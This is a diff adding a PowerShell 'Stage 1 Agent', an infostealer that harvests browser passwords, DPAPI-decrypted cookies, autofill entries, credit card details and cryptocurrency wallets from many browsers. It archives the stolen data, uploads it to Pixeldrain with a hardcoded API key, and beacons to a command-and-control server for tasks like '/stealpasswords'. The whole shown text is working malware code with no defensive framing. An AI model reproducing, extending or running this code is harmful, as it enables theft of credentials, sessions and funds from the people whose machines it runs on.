+        foreach ($profile in $profiles) {
+            $loginsPath = "$($profile.FullName)\logins.json"
+            if (Test-Path $loginsPath) {
+                try {
+                    $logins = Get-Content $loginsPath | ConvertFrom-Json
+                    foreach ($login in $logins.logins) {
+                        $passwords += @{
+                            Browser = $browserName
+                            Profile = $profile.Name
+                            URL = $login.hostname
+                            Username = $login.encryptedUsername
+                            Password = "**Encrypted**"
+                        }
+                    }
+                } catch {}
+            }
+        }
+    }
+    
+    Write-Log "Extracted $($passwords.Count) browser passwords"
+    return $passwords
+}
+
+function Get-BrowserCookies {
+    Write-Log "Extracting browser cookies..."
+    
+    $cookies = @()
+    
+    # Comprehensive Chromium-based browser cookie paths (matching Go agent exactly)
+    $chromiumCookiePaths = @{
+        "Chrome" = @(
+            "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies",
+            "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 1\Network\Cookies",
+            "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 2\Network\Cookies",
+            "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 3\Network\Cookies"
+        )
+        "Edge" = @(
+            "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies",
+            "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Profile 1\Network\Cookies",
+            "$env:LOCALAPPDATA\Microsoft\Edge Dev\User Data\Default\Network\Cookies",
+            "$env:LOCALAPPDATA\Microsoft\Edge Beta\User Data\Default\Network\Cookies",
+            "$env:LOCALAPPDATA\Microsoft\Edge Canary\User Data\Default\Network\Cookies"
+        )
+        "Brave" = @(
+            "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies",
+            "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Profile 1\Network\Cookies",
+            "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser-Beta\User Data\Default\Network\Cookies",
+            "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser-Dev\User Data\Default\Network\Cookies"
+        )
+        "Thorium" = @(
+            "$env:LOCALAPPDATA\Thorium\User Data\Default\Network\Cookies",
+            "$env:LOCALAPPDATA\Thorium\User Data\Profile 1\Network\Cookies"
+        )
+        "Opera" = @(
+            "$env:APPDATA\Opera Software\Opera Stable\Network\Cookies",
+            "$env:APPDATA\Opera Software\Opera Beta\Network\Cookies",
+            "$env:APPDATA\Opera Software\Opera Developer\Network\Cookies"
+        )
+        "Opera GX" = @(
+            "$env:APPDATA\Opera Software\Opera GX Stable\Network\Cookies",
+            "$env:APPDATA\Opera Software\Opera GX Beta\Network\Cookies"
+        )
+        "Vivaldi" = @(
+            "$env:LOCALAPPDATA\Vivaldi\User Data\Default\Network\Cookies",
+            "$env:LOCALAPPDATA\Vivaldi\User Data\Profile 1\Network\Cookies"
+        )
+        "Yandex" = @(
+            "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data\Default\Network\Cookies",
+            "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data\Profile 1\Network\Cookies"
+        )
+        "UC Browser" = @(
+            "$env:LOCALAPPDATA\UCBrowser\User Data\Default\Network\Cookies"
+        )
+        "Chromium" = @(
+            "$env:LOCALAPPDATA\Chromium\User Data\Default\Network\Cookies",
+            "$env:LOCALAPPDATA\Chromium\User Data\Profile 1\Network\Cookies"
+        )
+        "Cent Browser" = @(
+            "$env:LOCALAPPDATA\CentBrowser\User Data\Default\Network\Cookies"
+        )
+        "SRWare Iron" = @(
+            "$env:LOCALAPPDATA\Chromium\User Data\Default\Network\Cookies",
+            "C:\Program Files\SRWare Iron\User Data\Default\Network\Cookies",
+            "C:\Program Files (x86)\SRWare Iron\User Data\Default\Network\Cookies"
+        )
+        "Comodo Dragon" = @(
+            "$env:LOCALAPPDATA\Comodo\Dragon\User Data\Default\Network\Cookies"
+        )
+        "Torch Browser" = @(
+            "$env:LOCALAPPDATA\Torch\User Data\Default\Network\Cookies"
+        )
+        "Maxthon" = @(
+            "$env:LOCALAPPDATA\Maxthon3\User Data\Default\Network\Cookies",
+            "$env:LOCALAPPDATA\Maxthon5\User Data\Default\Network\Cookies"
+        )
+        "Slimjet" = @(
+            "$env:LOCALAPPDATA\Slimjet\User Data\Default\Network\Cookies"
+        )
+        "CocCoc" = @(
+            "$env:LOCALAPPDATA\CocCoc\Browser\User Data\Default\Network\Cookies"
+        )
+        "Avast Secure Browser" = @(
+            "$env:LOCALAPPDATA\AVAST Software\Browser\User Data\Default\Network\Cookies"
+        )
+        "AVG Secure Browser" = @(
+            "$env:LOCALAPPDATA\AVG\Browser\User Data\Default\Network\Cookies"
+        )
+        "360 Chrome" = @(
+            "$env:LOCALAPPDATA\360Chrome\Chrome\User Data\Default\Network\Cookies"
+        )
+        "QQBrowser" = @(
+            "$env:LOCALAPPDATA\Tencent\QQBrowser\User Data\Default\Network\Cookies"
+        )
+        "Sogou Explorer" = @(
+            "$env:LOCALAPPDATA\Sogou\SogouExplorer\User Data\Default\Network\Cookies"
+        )
+    }
+    
+    foreach ($browserName in $chromiumCookiePaths.Keys) {
+        $paths = $chromiumCookiePaths[$browserName]
+        
+        foreach ($cookiePath in $paths) {
+            if (-not (Test-Path $cookiePath)) {
+                continue
+            }
+            
+            Write-Log "Found $browserName cookies: $cookiePath"
+            
+            $query = "SELECT host_key, name, value, encrypted_value, expires_utc FROM cookies LIMIT 100"
+            $results = Query-SQLite -DatabasePath $cookiePath -Query $query
+            
+            foreach ($result in $results) {
+                $cookieValue = $result.value
+                
+                # Try to decrypt encrypted cookies
+                if ($result.encrypted_value -and $result.encrypted_value.GetType().Name -eq "Byte[]") {
+                    $decrypted = Decrypt-DPAPIBlob -EncryptedData $result.encrypted_value
+                    if ($decrypted) {
+                        $cookieValue = $decrypted
+                    }
+                }
+                
+                $cookies += @{
+                    Browser = $browserName
+                    Domain = $result.host_key
+                    Name = $result.name
+                    Value = $cookieValue
+                    Expires = $result.expires_utc
+                }
+            }
+        }
+    }
+    
+    # Check portable browser installations
+    $portablePaths = @(
+        "$env:USERPROFILE\Downloads",
+        "$env:USERPROFILE\Desktop",
+        "C:\PortableApps"
+    )
+    
+    foreach ($basePath in $portablePaths) {
+        if (-not (Test-Path $basePath)) {
+            continue
+        }
+        
+        $portablePattern = "$basePath\*Chrome*\User Data\Default\Network\Cookies"
+        $matches = Get-ChildItem -Path $portablePattern -ErrorAction SilentlyContinue
+        foreach ($match in $matches) {
+            $query = "SELECT host_key, name, value, encrypted_value, expires_utc FROM cookies LIMIT 100"
+            $results = Query-SQLite -DatabasePath $match.FullName -Query $query
+            
+            foreach ($result in $results) {
+                $cookieValue = $result.value
+                
+                if ($result.encrypted_value -and $result.encrypted_value.GetType().Name -eq "Byte[]") {
+                    $decrypted = Decrypt-DPAPIBlob -EncryptedData $result.encrypted_value
+                    if ($decrypted) {
+                        $cookieValue = $decrypted
+                    }
+                }
+                
+                $cookies += @{
+                    Browser = "Portable Chrome"
+                    Domain = $result.host_key
+                    Name = $result.name
+                    Value = $cookieValue
+                    Expires = $result.expires_utc
+                }
+            }
+        }
+    }
+    
+    # Firefox-based browsers (matching Go agent exactly)
+    $firefoxBasePaths = @{
+        "Firefox" = "$env:APPDATA\Mozilla\Firefox\Profiles"
+        "Firefox ESR" = "$env:APPDATA\Mozilla\Firefox ESR\Profiles"
+        "Firefox Dev" = "$env:APPDATA\Mozilla\Firefox Developer Edition\Profiles"
+        "Firefox Nightly" = "$env:APPDATA\Mozilla\Firefox Nightly\Profiles"
+        "Waterfox" = "$env:APPDATA\Waterfox\Profiles"
+        "Pale Moon" = "$env:APPDATA\Moonchild Productions\Pale Moon\Profiles"
+        "Basilisk" = "$env:APPDATA\Moonchild Productions\Basilisk\Profiles"
+        "LibreWolf" = "$env:APPDATA\LibreWolf\Profiles"
+        "SeaMonkey" = "$env:APPDATA\Mozilla\SeaMonkey\Profiles"
+        "IceCat" = "$env:APPDATA\Mozilla\IceCat\Profiles"
+        "K-Meleon" = "$env:APPDATA\K-Meleon\Profiles"
+        "Cyberfox" = "$env:APPDATA\8pecxstudios\Cyberfox\Profiles"
+        "Floorp" = "$env:APPDATA\Floorp\Profiles"
+    }
+    
+    foreach ($browserName in $firefoxBasePaths.Keys) {
+        $basePath = $firefoxBasePaths[$browserName]
+        
+        if (-not (Test-Path $basePath)) {
+            continue
+        }
+        
+        $profiles = Get-ChildItem $basePath -Directory -ErrorAction SilentlyContinue
+        foreach ($profile in $profiles) {
+            $cookiesPath = "$($profile.FullName)\cookies.sqlite"
+            if (Test-Path $cookiesPath) {
+                Write-Log "Found $browserName cookies: $cookiesPath"
+                
+                $query = "SELECT host, name, value, expiry FROM moz_cookies LIMIT 100"
+                $results = Query-SQLite -DatabasePath $cookiesPath -Query $query
+                
+                foreach ($result in $results) {
+                    $cookies += @{
+                        Browser = $browserName
+                        Domain = $result.host
+                        Name = $result.name
+                        Value = $result.value
+                        Expires = $result.expiry
+                    }
+                }
+            }
+        }
+    }
+    
+    Write-Log "Extracted $($cookies.Count) browser cookies"
+    return $cookies
+}
+
+function Get-BrowserAutofill {
+    Write-Log "Extracting browser autofill data..."
+    
+    $autofill = @()
+    
+    # Comprehensive Chromium-based browser autofill paths (matching Go agent exactly)
+    $chromiumAutofillPaths = @{
+        "Chrome" = @(
+            "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data",
+            "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 1\Web Data"
+        )
+        "Edge" = @(
+            "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data",
+            "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Profile 1\Web Data",
+            "$env:LOCALAPPDATA\Microsoft\Edge Dev\User Data\Default\Web Data"
+        )
+        "Brave" = @(
+            "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Web Data"
+        )
+        "Thorium" = @(
+            "$env:LOCALAPPDATA\Thorium\User Data\Default\Web Data",
+            "$env:LOCALAPPDATA\Thorium\User Data\Profile 1\Web Data"
+        )
+        "Opera" = @(
+            "$env:APPDATA\Opera Software\Opera Stable\Web Data"
+        )
+        "Opera GX" = @(
+            "$env:APPDATA\Opera Software\Opera GX Stable\Web Data"
+        )
+        "Vivaldi" = @(
+            "$env:LOCALAPPDATA\Vivaldi\User Data\Default\Web Data"
+        )
+        "Yandex" = @(
+            "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data\Default\Web Data"
+        )
+        "Chromium" = @(
+            "$env:LOCALAPPDATA\Chromium\User Data\Default\Web Data"
+        )
+        "Avast Secure Browser" = @(
+            "$env:LOCALAPPDATA\AVAST Software\Browser\User Data\Default\Web Data"
+        )
+        "AVG Secure Browser" = @(
+            "$env:LOCALAPPDATA\AVG\Browser\User Data\Default\Web Data"
+        )
+    }
+    
+    foreach ($browserName in $chromiumAutofillPaths.Keys) {
+        $paths = $chromiumAutofillPaths[$browserName]
+        
+        foreach ($webDataPath in $paths) {
+            if (-not (Test-Path $webDataPath)) {
+                continue
+            }
+            
+            Write-Log "Found $browserName autofill: $webDataPath"
+            
+            # Get autofill data
+            $query = "SELECT name, value, count FROM autofill ORDER BY count DESC LIMIT 50"
+            $results = Query-SQLite -DatabasePath $webDataPath -Query $query
+            
+            foreach ($result in $results) {
+                $autofill += @{
+                    Browser = $browserName
+                    Type = "Autofill"
+                    Name = $result.name
+                    Value = $result.value
+                    Count = $result.count
+                }
+            }
+            
+            # Get credit card data
+            $query = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
+            $results = Query-SQLite -DatabasePath $webDataPath -Query $query
+            
+            foreach ($result in $results) {
+                $autofill += @{
+                    Browser = $browserName
+                    Type = "CreditCard"
+                    NameOnCard = $result.name_on_card
+                    ExpirationMonth = $result.expiration_month
+                    ExpirationYear = $result.expiration_year
+                    Number = if ($result.card_number_encrypted) { "**Encrypted**" } else { "**No Data**" }
+                }
+            }
+            
+            # Get masked credit card data
+            $query = "SELECT name_on_card, network, last_four FROM masked_credit_cards"
+            $results = Query-SQLite -DatabasePath $webDataPath -Query $query
+            
+            foreach ($result in $results) {
+                $autofill += @{
+                    Browser = $browserName
+                    Type = "MaskedCreditCard"
+                    NameOnCard = $result.name_on_card
+                    Network = $result.network
+                    LastFour = $result.last_four
+                }
+            }
+        }
+    }
+    
+    # Firefox autofill (matching Go agent)
+    $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
+    if (Test-Path $firefoxPath) {
+        $profiles = Get-ChildItem $firefoxPath -Directory -ErrorAction SilentlyContinue
+        foreach ($profile in $profiles) {
+            $formhistoryPath = "$($profile.FullName)\formhistory.sqlite"
+            if (Test-Path $formhistoryPath) {
+                Write-Log "Found Firefox formhistory: $formhistoryPath"
+                
+                $query = "SELECT fieldname, value, timesUsed, firstUsed, lastUsed FROM moz_formhistory ORDER BY timesUsed DESC LIMIT 100"
+                $results = Query-SQLite -DatabasePath $formhistoryPath -Query $query
+                
+                foreach ($result in $results) {
+                    $autofill += @{
+                        Browser = "Firefox"
+                        Type = "FormHistory"
+                        Name = $result.fieldname
+                        Value = $result.value
+                        Count = $result.timesUsed
+                        FirstUsed = $result.firstUsed
+                        LastUsed = $result.lastUsed
+                    }
+                }
+            }
+        }
+    }
+    
+    Write-Log "Extracted $($autofill.Count) autofill entries"
+    return $autofill
+}
+
+# =============================================
+# WALLET DETECTION FUNCTIONS
+# =============================================
+
+function Get-DetectedWallets {
+    Write-Log "Detecting cryptocurrency wallets..."
+    
+    $wallets = @{
+        running_wallets = @()
+        installed_wallets = @()
+        browser_extensions = @()
+    }
+    
+    # Desktop wallet processes with friendly names
+    $walletProcessMap = @{
+        "exodus" = "Exodus"
+        "atomic" = "Atomic Wallet"
+        "electrum" = "Electrum"
+        "bitcoin-qt" = "Bitcoin Core"
+        "litecoin-qt" = "Litecoin Core"
+        "dogecoin-qt" = "Dogecoin Core"
+        "monero-wallet-gui" = "Monero GUI"
+        "zcash4win" = "Zcash"
+        "dash-qt" = "Dash Core"
+        "ethereum-wallet" = "Ethereum Wallet"
+        "mist" = "Mist"
+        "jaxx" = "Jaxx"
+        "coinomi" = "Coinomi"
+        "wasabi" = "Wasabi Wallet"
+        "sparrow" = "Sparrow"
+        "specter" = "Specter Desktop"
+    }
+    
+    $runningProcesses = Get-Process | Select-Object ProcessName, Id
+    foreach ($process in $runningProcesses) {
+        $processNameLower = $process.ProcessName.ToLower()
+        if ($walletProcessMap.ContainsKey($processNameLower)) {
+            $wallets.running_wallets += @{
+                process_name = $walletProcessMap[$processNameLower]
+                process_id   = $process.Id
+            }
+        }
+    }
+    
+    # Check for installed desktop wallets
+    $walletPaths = @{
+        "Exodus" = "$env:USERPROFILE\AppData\Roaming\Exodus"
+        "Atomic Wallet" = "$env:USERPROFILE\AppData\Roaming\atomic"
+        "Electrum" = "$env:USERPROFILE\AppData\Roaming\Electrum"
+        "Bitcoin Core" = "$env:USERPROFILE\AppData\Roaming\Bitcoin"
+        "Litecoin Core" = "$env:USERPROFILE\AppData\Roaming\Litecoin"
+        "Monero GUI" = "$env:USERPROFILE\Documents\Monero"
+        "Zcash" = "$env:USERPROFILE\AppData\Roaming\Zcash"
+        "Dash Core" = "$env:USERPROFILE\AppData\Roaming\DashCore"
+        "Ethereum Wallet" = "$env:USERPROFILE\AppData\Roaming\Ethereum Wallet"
+        "Jaxx" = "$env:USERPROFILE\AppData\Roaming\com.liberty.jaxx"
+        "Coinomi" = "$env:USERPROFILE\AppData\Local\Coinomi\Coinomi"
+    }
+    
+    foreach ($walletName in $walletPaths.Keys) {
+        $path = $walletPaths[$walletName]
+        if (Test-Path $path) {
+            $wallets.installed_wallets += @{
+                wallet_name  = $walletName
+                install_path = $path
+            }
+        }
+    }
+    
+    # Check for browser extension wallets
+    $extensionPaths = @{
+        "Chrome" = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Extensions"
+        "Edge" = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Extensions"
+        "Brave" = "$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Extensions"
+    }
+    
+    $walletExtensions = @{
+        "nkbihfbeogaeaoehlefnkodbefgpgknn" = "MetaMask"
+        "ibnejdfjmmkpcnlpebklmnkoeoihofec" = "TronLink"
+        "jbdaocneiiinmjbjlgalhcelgbejmnid" = "Nifty Wallet"
+        "afbcbjpbpfadlkmhmclhkeeodmamcflc" = "Math Wallet"
+        "hnfanknocfeofbddgcijnmhnfnkdnaad" = "Coinbase Wallet"
+        "fhbohimaelbohpjbbldcngcnapndodjp" = "Binance Chain Wallet"
+        "odbfpeeihdkbihmopkbjmoonfanlbfcl" = "Brave Wallet"
+        "bfnaelmomeimhlpmgjnjophhpkkoljpa" = "Phantom"
+        "egjidjbpglichdcondbcbdnbeeppgdph" = "Trust Wallet"
+    }
+    
+    foreach ($browser in $extensionPaths.Keys) {
+        $extensionPath = $extensionPaths[$browser]
+        if (Test-Path $extensionPath) {
+            $extensions = Get-ChildItem $extensionPath -Directory -ErrorAction SilentlyContinue
+            foreach ($extension in $extensions) {
+                if ($walletExtensions.ContainsKey($extension.Name)) {
+                    # Check if extension is active by looking for manifest
+                    $manifestPath = Join-Path $extension.FullName "manifest.json"
+                    $isActive = Test-Path $manifestPath
+                    
+                    $wallets.browser_extensions += @{
+                        browser        = $browser
+                        extension_name = $walletExtensions[$extension.Name]
+                        id             = $extension.Name
+                        is_active      = $isActive
+                        profile        = "Default"
+                    }
+                }
+            }
+        }
+    }
+    
+    Write-Log "Detected wallets - Running: $($wallets.running_wallets.Count), Installed: $($wallets.installed_wallets.Count), Extensions: $($wallets.browser_extensions.Count)"
+    return $wallets
+}
+
+# =============================================
+# MAIN EXECUTION FUNCTIONS
+# =============================================
+
+function Invoke-FullReconnaissance {
+    Write-Log "Starting comprehensive reconnaissance..." "WARN"
+    
+    # Collect system information
+    $systemProfile = Get-SystemProfile
+    $networkInfo = Get-NetworkInfo
+    
+    # Extract credentials
+    $passwords = Get-BrowserPasswords
+    $cookies = Get-BrowserCookies
+    $autofill = Get-BrowserAutofill
+    
+    # Detect wallets
+    $wallets = Get-DetectedWallets
+    
+    # Build comprehensive report
+    $report = @{
+        agent_id  = $AgentID
+        timestamp = [int64](([datetime]::UtcNow) - (Get-Date "1970-01-01 00:00:00")).TotalSeconds
+        ps_version = $PSVersionTable.PSVersion.ToString()
+        system_profile = $systemProfile
+        network_info   = $networkInfo
+        stolen_credentials = @{
+            browser_passwords = $passwords
+            browser_cookies   = $cookies
+            autofill_data     = $autofill
+        }
+        detected_wallets = $wallets
+    }
+    
+    Write-Log "Reconnaissance complete. Collected:"
+    Write-Log "  - Passwords: $($passwords.Count)"
+    Write-Log "  - Cookies: $($cookies.Count)"
+    Write-Log "  - Autofill: $($autofill.Count)"
+    Write-Log "  - Wallets: $($wallets.running_wallets.Count + $wallets.installed_wallets.Count + $wallets.browser_extensions.Count)"
+    
+    return $report
+}
+
+# =============================================
+# PIXELDRAIN INTEGRATION
+# =============================================
+
+function New-Archive {
+    param([hashtable]$Data, [string]$FileName)
+    
+    try {
+        # Create unique temp directory with timestamp and random ID
+        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
+        $randomId = [System.Guid]::NewGuid().ToString("N").Substring(0,8)
+        $tempDir = "$env:TEMP\archive_${timestamp}_${randomId}"
+        $jsonFile = "$tempDir\$FileName.json"
+        
+        # Ensure temp directory exists and is empty
+        if (Test-Path $tempDir) {
+            Remove-Item $tempDir -Recurse -Force
+        }
+        New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
+        
+        # Write data to JSON file
+        $Data | ConvertTo-Json -Depth 10 | Out-File -FilePath $jsonFile -Encoding UTF8
+        
+        # Create ZIP archive with unique name
+        $zipPath = "$env:TEMP\${FileName}_${timestamp}_${randomId}.zip"
+        if (Test-Path $zipPath) {
+            Remove-Item $zipPath -Force
+        }
+        
+        Add-Type -AssemblyName System.IO.Compression.FileSystem
+        [System.IO.Compression.ZipFile]::CreateFromDirectory($tempDir, $zipPath)
+        
+        # Clean up temp directory
+        Remove-Item $tempDir -Recurse -Force
+        
+        return $zipPath
+    } catch {
+        Write-Log "Failed to create archive: $_" "ERROR"
+        return $null
+    }
+}
+
+function Invoke-PixeldrainUpload {
+    param([string]$FilePath)
+    
+    try {
+        $fileName = [System.IO.Path]::GetFileName($FilePath)
+        $uploadUrl = "https://pixeldrain.com/api/file/$fileName"
+        $apiKey = "0c15316a-a603-4e3c-92a1-03d9fc6a9e7a"
+        
+        # Read file content
+        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
+        
+        # Create multipart form data
+        $boundary = [System.Guid]::NewGuid().ToString()
+        $headers = @{
+            'Content-Type' = "application/zip"
+            'Authorization' = "Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes(":$apiKey")))"
+        }
+        
+        Write-Log "Uploading to Pixeldrain: $fileName"
+        $response = Invoke-RestMethod -Uri $uploadUrl -Method PUT -Body $fileBytes -Headers $headers -TimeoutSec 300
+        
+        if ($response.id) {
+            $downloadUrl = "https://pixeldrain.com/u/$($response.id)"
+            Write-Log "Upload successful: $downloadUrl"
+            return $downloadUrl
+        } else {
+            Write-Log "Upload failed: No file ID returned" "ERROR"
+            return $null
+        }
+        
+    } catch {
+        Write-Log "Pixeldrain upload failed: $_" "ERROR"
+        return $null
+    } finally {
+        # Clean up uploaded file
+        if (Test-Path $FilePath) {
+            Remove-Item $FilePath -Force -ErrorAction SilentlyContinue
+        }
+    }
+}
+
+# =============================================
+# TASK POLLING AND EXECUTION
+# =============================================
+
+function Get-TasksFromC2 {
+    try {
+        # Create beacon request payload matching Go agent format
+        $beaconRequest = @{
+            agent_id = $AgentID
+            timestamp = [int64](([datetime]::UtcNow) - (Get-Date "1970-01-01 00:00:00")).TotalSeconds
+        } | ConvertTo-Json -Compress
+        
+        $headers = @{
+            'Content-Type' = 'application/json'
+            'User-Agent' = $UserAgent
+        }
+        
+        $response = Invoke-RestMethod -Uri "$C2Server/beacon" -Method POST -Body $beaconRequest -Headers $headers -TimeoutSec 10
+        
+        if ($response.has_task -and $response.task) {
+            Write-Log "Received task: $($response.task.type) - $($response.task.command)"
+            return $response.task
+        }
+        
+        return $null
+    } catch {
+        Write-Log "Failed to get tasks from C2: $_" "ERROR"
+        return $null
+    }
+}
+
+function Execute-Task {
+    param([hashtable]$Task)
+
+    # Map type to command if command not supplied
+    $cmd = $Task.command
+    if (-not $cmd -and $Task.type) {
+        switch ($Task.type) {
+            'steal_browser_passwords' { $cmd = '/stealpasswords' }
+            'steal_browser_cookies'   { $cmd = '/stealcookies'    }
+            'steal_browser_autofill'  { $cmd = '/stealautofill'   }
+            'detect_wallets'          { $cmd = '/detectwallets'   }
+            default {}
+        }
+    }
+    $Task | Add-Member -Force NoteProperty _effectiveCommand $cmd
+
+    try {
+        Write-Log "Executing task: $($cmd)" "WARN"
+        $success = $true
+        $output  = ''
+        $errorMsg = ''
+        $resultPayload = @{}
+
+        switch ($cmd) {
+            '/stealpasswords' {
+                $passwords = Get-BrowserPasswords
+                $resultPayload.CredentialData = @{ Passwords = $passwords }
+                $archiveFile = New-Archive -Data @{ passwords = $passwords } -FileName "passwords_$($AgentID.Substring(0,8))"
+                if ($archiveFile) {
+                    $uploadUrl = Invoke-PixeldrainUpload -FilePath $archiveFile
+                    if ($uploadUrl) {
+                        $resultPayload.pixeldrain_url = $uploadUrl
+                        $output = "Extracted $($passwords.Count) passwords. Upload: $uploadUrl"
+                    }
+                }
+            }
+            '/stealcookies' {
+                $cookies = Get-BrowserCookies
+                $resultPayload.CredentialData = @{ Cookies = $cookies }
+                $archiveFile = New-Archive -Data @{ cookies = $cookies } -FileName "cookies_$($AgentID.Substring(0,8))"
+                if ($archiveFile) {
+                    $uploadUrl = Invoke-PixeldrainUpload -FilePath $archiveFile
+                    if ($uploadUrl) {
+                        $resultPayload.pixeldrain_url = $uploadUrl
+                        $output = "Extracted $($cookies.Count) cookies. Upload: $uploadUrl"
+                    }
+                }
+            }
+            '/stealautofill' {
+                $autofill = Get-BrowserAutofill
+                $resultPayload.CredentialData = @{ Autofill = $autofill }
+                $archiveFile = New-Archive -Data @{ autofill = $autofill } -FileName "autofill_$($AgentID.Substring(0,8))"
+                if ($archiveFile) {
+                    $uploadUrl = Invoke-PixeldrainUpload -FilePath $archiveFile
+                    if ($uploadUrl) {
+                        $resultPayload.pixeldrain_url = $uploadUrl
+                        $output = "Extracted $($autofill.Count) autofill entries. Upload: $uploadUrl"
+                    }
+                }
+            }
+            '/detectwallets' {
+                $wallets = Get-DetectedWallets
+                # Format wallet data for C2 server compatibility (snake_case keys)
+                $resultPayload['detected_wallets'] = @{
+                    running_wallets    = $wallets.running_wallets
+                    installed_wallets  = $wallets.installed_wallets
+                    browser_extensions = $wallets.browser_extensions
+                }
+                $totalWallets = $wallets.running_wallets.Count + $wallets.installed_wallets.Count + $wallets.browser_extensions.Count
+                $output = "Detected $totalWallets wallets (Running: $($wallets.running_wallets.Count), Installed: $($wallets.installed_wallets.Count), Extensions: $($wallets.browser_extensions.Count))"
+            }
+            default {
+                $success = $false
+                $errorMsg = "Unknown command: $cmd"
+            }
+        }
+
+        $result = @{
+            task_id  = $Task.id
+            agent_id = $AgentID
+            success  = $success
+            output   = $output
+            error    = $errorMsg
+            timestamp = [int64](([datetime]::UtcNow) - (Get-Date '1970-01-01 00:00:00')).TotalSeconds
+        } + $resultPayload
+
+        Submit-TaskResult -Result $result
+        return $result
+    } catch {
+        $err = $_.Exception.Message
+        Write-Log "Task execution failed: $err" "ERROR"
+        $result = @{
+            task_id  = $Task.id
+            agent_id = $AgentID
+            success  = $false
+            output   = ''
+            error    = "Execution failed: $err"
+            timestamp = [int64](([datetime]::UtcNow) - (Get-Date '1970-01-01 00:00:00')).TotalSeconds
+        }
+        Submit-TaskResult -Result $result
+    }
+}
+
+function Submit-TaskResult {
+    param([hashtable]$Result)
+
+    try {
+        $jsonResult = $Result | ConvertTo-Json -Depth 10 -Compress
+        $headers = @{ 'Content-Type' = 'application/json'; 'User-Agent' = $UserAgent }
+        Invoke-RestMethod -Uri "$C2Server/result" -Method POST -Body $jsonResult -Headers $headers -TimeoutSec 30 | Out-Null
+        Write-Log "Task result submitted successfully"
+    } catch {
+        Write-Log "Failed to submit task result: $_" "ERROR"
+    }
+}
+
+function Start-BeaconLoop {
+    Write-Log "Starting beacon loop with $BeaconInterval second intervals..." "WARN"
+    
+    while ($true) {
+        try {
+            # Check for upgrade
+            if (Check-UpgradeStatus) {
+                Write-Log "Upgrade to Stage 2 detected! Exiting..." "WARN"
+                break
+            }
+            
+            # Poll for tasks
+            $task = Get-TasksFromC2
+            if ($task) {
+                # Convert PSCustomObject to hashtable for Execute-Task
+                $taskHash = @{}
+                $task.PSObject.Properties | ForEach-Object { $taskHash[$_.Name] = $_.Value }
+                Execute-Task -Task $taskHash
+            }
+            
+            Start-Sleep -Seconds $BeaconInterval
+            
+        } catch {
+            Write-Log "Beacon loop error: $_" "ERROR"
+            Start-Sleep -Seconds $BeaconInterval
+        }
+    }
+}
+
+# =============================================
+# MAIN EXECUTION
+# =============================================
+
+try {
+    Write-Log "PowerShell Stage 1 Agent starting..." "WARN"
+    Write-Log "Agent ID: $AgentID"
+    Write-Log "C2 Server: $C2Server"
+    Write-Log "Beacon Interval: $BeaconInterval seconds"
+    
+    # Ensure single instance per agent
+    Stop-PreviousInstances
+    
+    # Load SQLite assembly for credential extraction
+    $script:sqliteAvailable = Load-SQLiteAssembly
+    if ($script:sqliteAvailable) {
+        Write-Log "SQLite support enabled - full credential extraction available"
+    } else {
+        Write-Log "SQLite support disabled - credential extraction will be limited" "WARN"
+    }
+    
+    # Perform initial reconnaissance
+    $reconReport = Invoke-FullReconnaissance
+    
+    # Send report to C2 server
+    $reportSent = Send-ReportToC2 -ReportData $reconReport
+    
+    if ($reportSent) {
+        Write-Log "Initial reconnaissance report submitted successfully!" "WARN"
+        
+        # Start beacon loop for upgrade checks
+        Start-BeaconLoop
+        
+    } else {
+        Write-Log "Failed to submit reconnaissance report" "ERROR"
+    }
+    
+} catch {
+    Write-Log "Stage 1 execution failed: $_" "ERROR"
+} finally {
+    Write-Log "Stage 1 agent terminating..."
+}
